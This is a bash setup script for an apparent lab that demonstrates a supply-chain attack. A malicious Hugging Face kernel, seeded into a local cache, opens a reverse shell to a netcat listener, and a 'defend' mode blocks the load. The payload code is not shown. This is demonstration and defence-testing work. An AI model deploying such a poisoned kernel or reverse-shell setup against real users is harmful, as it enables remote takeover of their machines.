#!/usr/bin/env bash
# One-time setup. Seeds the offline kernel cache FIRST (instant, no network),
# then ensures deps are present. No Docker, no Hugging Face Hub at runtime.
set -uo pipefail
REPO="$(cd "$(dirname "$0")" && pwd)"
export HF_HOME="$REPO/.hfcache"
HUB="$HF_HOME/hub"
REV="0000000000000000000000000000000000000001"

echo "[1/4] Seeding offline cache for the malicious kernel at $HUB"
d="$HUB/models--malatker--evil-kernel"; s="$d/snapshots/$REV"
rm -rf "$d"; mkdir -p "$s" "$d/refs"
cp -r "$REPO/payload/evil-kernel/." "$s/"
echo -n "$REV" > "$d/refs/main"
echo "    seeded malatker/evil-kernel"

echo "[2/4] Ensuring netcat is available (listener); ignored if apt is unavailable"
if ! command -v nc >/dev/null 2>&1; then
  (apt-get update -qq && apt-get install -y -qq netcat-openbsd) 2>/dev/null \
    || echo "    (skip) no nc and apt unavailable — attacker.sh will use its Python listener"
fi

echo "[3/4] Ensuring Python deps (torch 2.5.1+cu121, transformers 5.2.0, kernels)"
if python3 -c "import torch,transformers,kernels" 2>/dev/null; then
  echo "    already installed — skipping pip"
else
  PF=""   # auto-add --break-system-packages on PEP-668 managed interpreters
  python3 -c "import os,sysconfig,sys; sys.exit(0 if os.path.exists(os.path.join(sysconfig.get_path('stdlib'),'EXTERNALLY-MANAGED')) else 1)" && PF="--break-system-packages"
  pip install -q $PF "torch==2.5.1" --index-url https://download.pytorch.org/whl/cu121 \
    || { echo "    !! torch install failed — check networking, then re-run"; exit 1; }
  pip install -q $PF "transformers==5.2.0" "kernels==0.10.5" "huggingface_hub" \
    || { echo "    !! deps install failed"; exit 1; }
fi

echo "[4/4] Verifying the environment matches the bundled kernel variant"
python3 - <<'PY'
import torch
v = torch.version.cuda
print(f"    torch {torch.__version__}  cuda {v}")
assert v == "12.1", f"torch.version.cuda is {v}, need 12.1 (install torch==2.5.1+cu121)"
from kernels.utils import build_variant
bv = build_variant()
print(f"    kernel build variant: {bv}")
assert bv == "torch25-cxx98-cu121-x86_64-linux", f"variant {bv} will NOT match the bundled kernel"
print("    OK")
PY

echo
echo "[+] Setup complete. In two terminals:"
echo "      Terminal 1:  bash attacker.sh"
echo "      Terminal 2:  bash victim.sh         # attack (reverse shell)"
echo "                   bash victim.sh defend  # defended (load blocked)"
